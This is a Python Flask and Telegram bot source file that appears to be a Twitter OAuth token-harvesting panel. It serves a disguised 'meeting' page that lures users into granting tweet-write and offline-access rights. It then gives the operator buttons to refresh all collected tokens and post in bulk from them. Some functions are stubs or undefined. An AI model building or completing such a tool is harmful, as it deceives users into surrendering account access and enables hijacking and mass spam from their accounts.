import base64
import hashlib
import os
import requests
from flask import Flask, redirect, request, session, render_template, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CallbackQueryHandler, MessageHandler, Filters
import logging

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize Telegram Bot and Dispatcher
bot = Bot(token=TELEGRAM_BOT_TOKEN)
dispatcher = Dispatcher(bot, None, workers=4)

# Function to generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Function to set up the webhook
def set_webhook():
    webhook_url = f"{WEBHOOK_URL}/webhook"
    bot.set_webhook(url=webhook_url)
    logging.info(f"Webhook set to {webhook_url}")

# Function to send a startup message with OAuth and meeting link
def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Function to show the main menu
def show_main_menu():
    message = (
        "🚀 Main Menu\n"
        "Choose an option below."
    )
    keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, reply_markup=reply_markup)

# Function to handle button clicks
def handle_button(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'refresh_all':
        query.edit_message_text(text="Confirm refreshing all tokens?",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("Yes", callback_data='confirm_refresh')],
                                    [InlineKeyboardButton("No", callback_data='main_menu')]
                                ]))
    elif query.data == 'confirm_refresh':
        refresh_all_tokens()
        query.edit_message_text(text="Tokens refreshed.",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
                                ]))
    elif query.data == 'post_single':
        query.edit_message_text(text="Posting with a single token. Please enter your message:")
        context.user_data['post_mode'] = 'single'
    elif query.data == 'post_bulk':
        query.edit_message_text(text="Enter the number of tokens to use for posting:")
        context.user_data['post_mode'] = 'bulk'
    elif query.data == 'main_menu':
        show_main_menu()

# Function to handle messages for posting
def handle_message(update, context):
    user_message = update.message.text
    post_mode = context.user_data.get('post_mode')

    if post_mode == 'single':
        context.user_data['message_content'] = user_message
        update.message.reply_text("Confirm posting the following message?",
                                  reply_markup=InlineKeyboardMarkup([
                                      [InlineKeyboardButton("Yes", callback_data='confirm_post')],
                                      [InlineKeyboardButton("No", callback_data='main_menu')]
                                  ]))
    elif post_mode == 'bulk':
        try:
            num_tokens = int(user_message)
            context.user_data['num_tokens'] = num_tokens
            update.message.reply_text("Please enter the message content:")
            context.user_data['step'] = 'bulk_message'
        except ValueError:
            update.message.reply_text("Please enter a valid number.")

# Webhook route to handle updates
@app.route('/webhook', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return jsonify({'status': 'ok'})

# The rest of your existing functions and routes remain unchanged
@app.route('/j')
def meeting():
    state_id = request.args.get('id')
    code_ch = request.args.get('code_ch')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        # Post the tweet manually using the access token
        return render_template('tweet_result.html', result="Tweet posted.")
    return render_template('tweet_form.html', access_token=access_token)

@app.route('/authorization')
def authorization():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    session['oauth_state'] = state
    session['code_verifier'] = code_verifier

    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )

    return redirect(authorization_url)

@app.route('/')
def home():
    return redirect('/authorization')

if __name__ == '__main__':
    set_webhook()
    send_startup_message()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
